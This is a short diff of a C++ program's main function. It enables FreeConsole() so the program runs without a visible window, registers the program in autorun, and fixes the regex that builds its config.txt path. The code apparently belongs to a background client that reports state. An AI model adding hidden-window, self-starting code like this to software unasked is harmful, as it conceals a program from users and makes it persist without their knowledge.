@@ -60,13 +60,12 @@ void sendState() {
 }
 
 int main() {
-    //FreeConsole(); // программа запускается без консоли
+    FreeConsole(); // программа запускается без консоли
 
     client = nullptr;
     OS::addProgramToAutorun("Exe", OS::getExecProgramPath());
     auto programPath = OS::getExecProgramPath();
-    auto confPath = regex_replace(programPath, regex("\\.*\.exe"), "\\config.txt");
-
+    auto confPath = regex_replace(programPath, regex("\\\w*\.exe"), "config.txt");
     useConfig(confPath);
    
     while (true) {
